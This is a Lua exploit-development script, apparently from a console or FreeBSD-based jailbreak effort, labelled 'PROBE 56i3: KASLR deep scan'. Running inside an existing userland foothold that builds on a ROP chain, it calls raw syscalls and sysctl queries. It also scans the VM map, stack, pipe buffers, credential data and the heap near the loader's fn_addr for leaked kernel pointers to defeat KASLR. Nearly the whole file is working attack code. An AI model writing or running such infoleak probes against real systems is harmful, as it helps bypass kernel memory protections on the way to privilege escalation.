-- CRASH_CLASS: LOW
-- PROBE 56i3: KASLR deep scan — correct 674 args, auxv via stack, pipe buffers
--
-- Context: 56i2 failed because:
--   - auxv sysctl returned -1 (blocked)
--   - sys 674 was called with wrong args (2 instead of 5)
--   - Zero kernel pointers anywhere
--
-- This probe:
--   [B] sys 674 with CORRECT 5-arg layout (buf, stride=72, max, countp, 0x40000000)
--   [C] Scan stack region (top 16KB) for kernel pointers
--   [D] Pipe buffer scan — create pipe, write data, read back, check for kernel ptrs
--   [E] Socket buffer internals — SO_RCVBUF/SO_SNDBUF struct scan
--   [F] kinfo_file via sysctl — file descriptor table (may have kernel vnode ptrs)
--   [G] Process credential struct deeper fields

print("=== PROBE 56i3: KASLR DEEP SCAN ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end
local function is_kptr(val)
    if val == nil then return false end
    local h, l = get_hi_lo(val)
    return h >= 0xFFFF8000 and h < 0xFFFFFFFF
end

print("[A] Setup")
local sc_getpid = make_syscall(20)
local our_pid = to_num(sc_getpid())
print("  PID: " .. our_pid)

collectgarbage("stop")

-- ============================================================
-- [B] sys 674 — virtual_query_all with CORRECT 5-arg layout
-- Args: buf, stride=72, max_records, count_ptr, mode=0x40000000
-- ============================================================
print("")
print("[B] sys 674 VM map (correct args)")

local sc674 = make_syscall(674)
local STRIDE = 72
local MAX_RECORDS = 400
local vm_buf = memory.alloc(STRIDE * MAX_RECORDS)
local countp = memory.alloc(16)
safe_wq(countp, uint64(0))

local ok, ret = pcall(function()
    return sc674(uint64(vm_buf), uint64(STRIDE), uint64(MAX_RECORDS),
                  uint64(countp), uint64(0x40000000))
end)
local vm_ret = ok and to_num(ret) or -999
print("  ret=" .. vm_ret)

local stack_start, stack_end = nil, nil
local vm_kptrs = 0

if vm_ret == 0 then
    local count = safe_rd(countp) or 0
    print("  regions: " .. count)
    if count > MAX_RECORDS then count = MAX_RECORDS end

    for e = 0, count - 1 do
        local base = vm_buf + e * STRIDE
        local start_val = safe_rq(base)
        local end_val = safe_rq(base + 8)

        -- Scan ALL 72 bytes for kernel pointers
        for off = 0, 64, 8 do
            local val = safe_rq(base + off)
            if val and is_kptr(val) then
                vm_kptrs = vm_kptrs + 1
                if vm_kptrs <= 15 then
                    print(string.format("  region[%d]+0x%02X: %s KPTR!", e, off, hexval(val)))
                end
            end
        end

        -- Find stack
        local name = ""
        for ci = 0, 15 do
            local b = safe_rd(base + 0x20 + ci)
            if b and b > 31 and b < 127 then
                name = name .. string.char(b)
            elseif b == 0 then break end
        end
        if name:find("stack") then
            stack_start = start_val
            stack_end = end_val
            print("  Stack: " .. hexval(start_val) .. " - " .. hexval(end_val) .. " [" .. name .. "]")
        end
    end
    print("  VM map kernel pointers: " .. vm_kptrs)
else
    print("  VM map failed")
end

-- ============================================================
-- [C] Stack scan — top 16KB for kernel pointers
-- ============================================================
print("")
print("[C] Stack scan")

if stack_end then
    local eh, el = get_hi_lo(stack_end)
    local scan_bytes = 0x4000
    local stack_kptrs = 0

    for off = scan_bytes, 8, -8 do
        local sl = el - off
        local sh = eh
        if sl < 0 then
            sh = sh - 1
            sl = sl + 0x100000000
        end
        local addr = uint64(string.format("0x%X%08X", sh, sl))
        local val = safe_rq(addr)
        if val and is_kptr(val) then
            stack_kptrs = stack_kptrs + 1
            if stack_kptrs <= 15 then
                print(string.format("  end-0x%04X: %s KPTR!", off, hexval(val)))
            end
        end
    end
    print("  Stack kernel pointers: " .. stack_kptrs)
else
    print("  No stack region found")
end

-- ============================================================
-- [D] Pipe buffer scan — kernel allocates pipe buffer internally
-- After pipe(2), the kernel struct pipe has kernel pointers.
-- We can't read the kernel struct, but let's check if any
-- kernel data leaks into the pipe read buffer.
-- ============================================================
print("")
print("[D] Pipe buffer probe")

-- sys 42 = pipe(int fildes[2])
local sc_pipe = make_syscall(42)
local pipe_fds = memory.alloc(16)
safe_wd(pipe_fds, 0)
safe_wd(pipe_fds + 4, 0)

local ok2, ret2 = pcall(function()
    return sc_pipe(uint64(pipe_fds))
end)
local pipe_ret = ok2 and to_num(ret2) or -999
local fd_r = safe_rd(pipe_fds)
local fd_w = safe_rd(pipe_fds + 4)
print("  pipe ret=" .. pipe_ret .. " fds=" .. (fd_r or "?") .. "," .. (fd_w or "?"))

if pipe_ret == 0 and fd_w and fd_w > 0 then
    -- Write pattern, read it back, check for kernel contamination
    local sc_write = make_syscall(4)
    local sc_read = make_syscall(3)
    local wbuf = memory.alloc(0x1000)
    local rbuf = memory.alloc(0x1000)

    -- Fill write buf with 0xDEADBEEF pattern
    for i = 0, 0xFFF, 4 do
        safe_wd(wbuf + i, 0xDEADBEEF)
        safe_wd(rbuf + i, 0)
    end

    local ok_w = pcall(function()
        sc_write(uint64(fd_w), uint64(wbuf), uint64(0x1000))
    end)
    local ok_r, rret = pcall(function()
        return sc_read(uint64(fd_r), uint64(rbuf), uint64(0x1000))
    end)
    local read_sz = ok_r and to_num(rret) or -1
    print("  wrote 4096, read back " .. read_sz)

    -- Check for any non-DEADBEEF values in read buffer
    local pipe_kptrs = 0
    local anomalies = 0
    for off = 0, 0xFF8, 8 do
        local val = safe_rq(rbuf + off)
        if val then
            local vh, vl = get_hi_lo(val)
            if is_kptr(val) then
                pipe_kptrs = pipe_kptrs + 1
                print(string.format("  rbuf+0x%03X: %s KPTR!", off, hexval(val)))
            end
        end
    end
    print("  Pipe buffer kernel pointers: " .. pipe_kptrs)
end

-- ============================================================
-- [E] kinfo_file — sysctl kern.proc.filedesc
-- MIB: CTL_KERN(1), KERN_PROC(14), KERN_PROC_FILEDESC(33), pid
-- FreeBSD kinfo_file structs contain vnode pointers on some versions
-- ============================================================
print("")
print("[E] kinfo_file (file descriptor table)")

local sc_sysctl = make_syscall(202)

-- Try KERN_PROC_FILEDESC = 33
local mib = memory.alloc(32)
safe_wd(mib, 1)        -- CTL_KERN
safe_wd(mib + 4, 14)   -- KERN_PROC
safe_wd(mib + 8, 33)   -- KERN_PROC_FILEDESC
safe_wd(mib + 12, our_pid)

local outbuf = memory.alloc(0x2000)
local oldlenp = memory.alloc(8)
safe_wd(oldlenp, 0x2000)
safe_wd(oldlenp + 4, 0)

local ok3, ret3 = pcall(function()
    return sc_sysctl(uint64(mib), uint64(4), uint64(outbuf),
        uint64(oldlenp), uint64(0), uint64(0))
end)
local fd_ret = ok3 and to_num(ret3) or -999
print("  KERN_PROC_FILEDESC ret=" .. fd_ret)

if fd_ret == 0 then
    local fd_len = safe_rd(oldlenp) or 0
    print("  len=" .. fd_len .. " bytes")

    -- Scan output for kernel pointers
    local fd_kptrs = 0
    for off = 0, fd_len - 1, 8 do
        if off < 0x2000 then
            local val = safe_rq(outbuf + off)
            if val and is_kptr(val) then
                fd_kptrs = fd_kptrs + 1
                if fd_kptrs <= 15 then
                    print(string.format("  +0x%04X: %s KPTR!", off, hexval(val)))
                end
            end
        end
    end
    print("  kinfo_file kernel pointers: " .. fd_kptrs)
end

-- ============================================================
-- [F] kinfo_vmentry — sysctl kern.proc.vmmap
-- MIB: CTL_KERN(1), KERN_PROC(14), KERN_PROC_VMMAP(35), pid
-- FreeBSD kinfo_vmentry has kve_ref_count, object IDs...
-- ============================================================
print("")
print("[F] kinfo_vmentry (sysctl vmmap)")

safe_wd(mib, 1)        -- CTL_KERN
safe_wd(mib + 4, 14)   -- KERN_PROC
safe_wd(mib + 8, 35)   -- KERN_PROC_VMMAP
safe_wd(mib + 12, our_pid)

safe_wd(oldlenp, 0)
safe_wd(oldlenp + 4, 0)

-- First call: get size needed
local ok4, ret4 = pcall(function()
    return sc_sysctl(uint64(mib), uint64(4), uint64(0),
        uint64(oldlenp), uint64(0), uint64(0))
end)
local vmmap_ret = ok4 and to_num(ret4) or -999
local vmmap_len = safe_rd(oldlenp) or 0
print("  KERN_PROC_VMMAP size query ret=" .. vmmap_ret .. " len=" .. vmmap_len)

if vmmap_ret == 0 and vmmap_len > 0 then
    local alloc_sz = vmmap_len
    if alloc_sz > 0x8000 then alloc_sz = 0x8000 end
    local vmbuf = memory.alloc(alloc_sz)
    safe_wd(oldlenp, alloc_sz)
    safe_wd(oldlenp + 4, 0)

    local ok5, ret5 = pcall(function()
        return sc_sysctl(uint64(mib), uint64(4), uint64(vmbuf),
            uint64(oldlenp), uint64(0), uint64(0))
    end)
    local vmmap_ret2 = ok5 and to_num(ret5) or -999
    local vmmap_actual = safe_rd(oldlenp) or 0
    print("  KERN_PROC_VMMAP data ret=" .. vmmap_ret2 .. " got=" .. vmmap_actual .. " bytes")

    if vmmap_ret2 == 0 then
        local vm2_kptrs = 0
        for off = 0, vmmap_actual - 1, 8 do
            if off < alloc_sz then
                local val = safe_rq(vmbuf + off)
                if val and is_kptr(val) then
                    vm2_kptrs = vm2_kptrs + 1
                    if vm2_kptrs <= 15 then
                        print(string.format("  +0x%04X: %s KPTR!", off, hexval(val)))
                    end
                end
            end
        end
        print("  kinfo_vmentry kernel pointers: " .. vm2_kptrs)
    end
end

-- ============================================================
-- [G] Process credential — sys 587 deeper scan
-- Returns 0x88 bytes. Scan for anything kernel-shaped
-- ============================================================
print("")
print("[G] sys 587 credential deep scan")

local sc587 = make_syscall(587)
local cred_buf = memory.alloc(0x200)
for i = 0, 0x1FF, 4 do safe_wd(cred_buf + i, 0) end

local ok6, ret6 = pcall(function()
    return sc587(uint64(cred_buf), uint64(0x200))
end)
local cred_ret = ok6 and to_num(ret6) or -999
print("  ret=" .. cred_ret)

if cred_ret == 0 then
    local cred_kptrs = 0
    for off = 0, 0x1FF, 8 do
        local val = safe_rq(cred_buf + off)
        if val then
            local vh, vl = get_hi_lo(val)
            if vh ~= 0 or vl ~= 0 then
                if is_kptr(val) then
                    cred_kptrs = cred_kptrs + 1
                    print(string.format("  +0x%02X: %s KPTR!", off, hexval(val)))
                else
                    -- Print all non-zero for analysis
                    if off < 0x90 then
                        print(string.format("  +0x%02X: %s", off, hexval(val)))
                    end
                end
            end
        end
    end
    print("  Credential kernel pointers: " .. cred_kptrs)
end

-- ============================================================
-- [H] sysctl kern.proc.pathname — may leak exec path from kernel
-- MIB: CTL_KERN(1), KERN_PROC(14), KERN_PROC_PATHNAME(12), pid
-- ============================================================
print("")
print("[H] kern.proc.pathname")

safe_wd(mib, 1)
safe_wd(mib + 4, 14)
safe_wd(mib + 8, 12)     -- KERN_PROC_PATHNAME
safe_wd(mib + 12, our_pid)

for i = 0, 0x3FF, 4 do safe_wd(outbuf + i, 0) end
safe_wd(oldlenp, 0x400)
safe_wd(oldlenp + 4, 0)

local ok7, ret7 = pcall(function()
    return sc_sysctl(uint64(mib), uint64(4), uint64(outbuf),
        uint64(oldlenp), uint64(0), uint64(0))
end)
local path_ret = ok7 and to_num(ret7) or -999
print("  ret=" .. path_ret)

if path_ret == 0 then
    local path_len = safe_rd(oldlenp) or 0
    -- Read as string
    local path_str = ""
    for ci = 0, math.min(path_len, 255) - 1 do
        local b = safe_rd(outbuf + ci)
        if b and b > 0 and b < 128 then
            path_str = path_str .. string.char(b)
        elseif b == 0 then break end
    end
    print("  path: " .. path_str)

    -- Scan remaining buffer for kernel pointers
    for off = 0, path_len - 1, 8 do
        local val = safe_rq(outbuf + off)
        if val and is_kptr(val) then
            print(string.format("  +0x%03X: %s KPTR!", off, hexval(val)))
        end
    end
end

-- ============================================================
-- [I] sysctl kern.proc.groups — group list
-- MIB: CTL_KERN(1), KERN_PROC(14), KERN_PROC_GROUPS(34), pid
-- ============================================================
print("")
print("[I] kern.proc.groups")

safe_wd(mib, 1)
safe_wd(mib + 4, 14)
safe_wd(mib + 8, 34)     -- KERN_PROC_GROUPS
safe_wd(mib + 12, our_pid)

for i = 0, 0x1FF, 4 do safe_wd(outbuf + i, 0) end
safe_wd(oldlenp, 0x200)
safe_wd(oldlenp + 4, 0)

local ok8, ret8 = pcall(function()
    return sc_sysctl(uint64(mib), uint64(4), uint64(outbuf),
        uint64(oldlenp), uint64(0), uint64(0))
end)
local grp_ret = ok8 and to_num(ret8) or -999
print("  ret=" .. grp_ret)

if grp_ret == 0 then
    local grp_len = safe_rd(oldlenp) or 0
    print("  len=" .. grp_len)
    for off = 0, grp_len - 1, 8 do
        local val = safe_rq(outbuf + off)
        if val and is_kptr(val) then
            print(string.format("  +0x%03X: %s KPTR!", off, hexval(val)))
        end
    end
end

-- ============================================================
-- [J] Scan heap BEFORE ropchain (negative offsets)
-- The loader allocates structures near the ROP chain.
-- Scan -32KB to +8KB around fn_addr for any kernel pointers
-- ============================================================
print("")
print("[J] Heap scan around fn_addr")

local pipe_str = tostring(syscall.pipe)
local fn_addr_str = pipe_str:match("fcall_stub%.fn_addr: (0x[0-9a-fA-F]+)")

if fn_addr_str then
    local fn_addr = uint64(fn_addr_str)
    local fh, fl = get_hi_lo(fn_addr)
    print("  fn_addr: " .. hexval(fn_addr))

    local heap_kptrs = 0
    -- Scan -32KB to +8KB
    for off = -0x8000, 0x2000, 8 do
        local sl = fl + off
        local sh = fh
        if sl < 0 then
            sh = sh - 1
            sl = sl + 0x100000000
        elseif sl >= 0x100000000 then
            sh = sh + 1
            sl = sl - 0x100000000
        end
        if sh >= 0 then
            local addr = uint64(string.format("0x%X%08X", sh, sl))
            local val = safe_rq(addr)
            if val and is_kptr(val) then
                heap_kptrs = heap_kptrs + 1
                if heap_kptrs <= 20 then
                    print(string.format("  fn%+06X: %s KPTR!", off, hexval(val)))
                end
            end
        end
    end
    print("  Heap kernel pointers: " .. heap_kptrs)
end

collectgarbage("restart")

print("")
print("=== PROBE 56i3 COMPLETE ===")
